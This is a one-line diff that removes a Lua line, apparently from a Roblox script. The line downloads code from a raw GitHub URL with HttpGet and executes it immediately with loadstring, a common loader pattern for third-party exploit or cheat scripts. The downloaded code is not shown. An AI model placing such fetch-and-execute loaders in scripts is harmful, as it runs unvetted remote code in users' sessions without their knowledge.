@@ -1,1 +1,0 @@
-loadstring(game:HttpGet"https://raw.githubusercontent.com/Raijin333/animead/main/animead")()
